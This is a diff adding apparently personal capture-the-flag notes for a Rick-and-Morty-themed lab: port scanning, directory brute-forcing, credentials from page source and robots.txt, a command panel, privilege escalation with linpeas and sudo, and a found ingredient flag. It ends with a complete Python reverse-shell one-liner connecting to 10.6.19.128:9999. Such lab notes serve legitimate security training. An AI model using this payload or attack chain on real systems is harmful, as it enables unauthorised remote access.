@@ -1,0 +1,34 @@
+Notes taken before attempt (not in order)
+
+1. scan ports sC sV oN
+2. inspect page (username: R1ckRul3s)
+3. nikto / hydra scan
+4. gobuster -u http://domain -w /dir/wordlist.txt -x php,sh,txt,cgi,html,js,css,py (only need php)
+5. /robots.txt (Wubbalubbadubdub)
+6. login portal
+7. command panel (ls) can not use cat or echo <
+8. grep . clue.txt / while read line; do echo $line; done < clue.txt
+9. grep -R
+10. check portal source (shows what commands can't be run)
+11. python3 is enabled on command panel
+12. pentest monkey reverse shell (set to port 9999)
+13. nc -lnvp <port number>
+14. stabilize_shell3  (poor-mans-pentest)(pythong revshell)
+15. stty raw -echo
+16. init step 13
+17. upload_file_nc.sh /opt/linpeas.sh
+18. nc -q 0 <machine IP> 19934 > /dev/shm/lin (chmod +x linpeas)
+19. run linpeas.sh
+20. sudo bash
+
+Found during run
+
+1. /var/www/html/Sup3rS3cretPickl3Ingred.txt
+2. Sup3rS3cretPickl3Ingred.txt:mr. meeseek hair
+3. customize reverse shell payload (10.6.19.128)
+4. 
+
+
+PTM payload
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.19.128",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
